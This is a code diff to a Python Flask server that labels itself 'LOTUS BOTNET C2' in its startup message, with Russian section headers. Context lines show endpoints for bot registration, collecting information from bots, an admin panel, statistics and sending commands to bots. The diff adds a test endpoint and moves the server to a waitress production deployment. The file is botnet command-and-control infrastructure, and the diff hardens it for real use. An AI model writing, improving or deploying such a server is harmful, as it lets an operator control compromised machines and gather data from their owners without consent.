@@ -42,6 +42,10 @@ def init_db():
 
 init_db()
 
+# ============================================================
+# API ДЛЯ БОТОВ
+# ============================================================
+
 @app.route('/api/register')
 def register():
     bot_id = request.args.get('id')
@@ -106,6 +110,10 @@ def save_info():
     conn.commit()
     conn.close()
     return 'OK'
+
+# ============================================================
+# АДМИН-ПАНЕЛЬ
+# ============================================================
 
 @app.route('/')
 def admin():
@@ -341,6 +349,10 @@ def admin():
 </html>'''
     return html
 
+# ============================================================
+# API ДЛЯ ФРОНТЕНДА
+# ============================================================
+
 @app.route('/api/stats')
 def api_stats():
     conn = get_db()
@@ -406,5 +418,23 @@ def api_send_command():
     conn.close()
     return 'OK'
 
+# ============================================================
+# ДОПОЛНИТЕЛЬНО: API ДЛЯ ПРОВЕРКИ
+# ============================================================
+
+@app.route('/api/test')
+def test():
+    return jsonify({'status': 'ok', 'time': time.time()})
+
+# ============================================================
+# ЗАПУСК С WAITRESS (ПРОДУКШН)
+# ============================================================
+
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    try:
+        from waitress import serve
+        print("🔥 LOTUS BOTNET C2 запущен на waitress (production)")
+        serve(app, host='0.0.0.0', port=5000, threads=8)
+    except ImportError:
+        print("⚠️ waitress не установлен, использую Flask development server")
+        app.run(host='0.0.0.0', port=5000, debug=False)
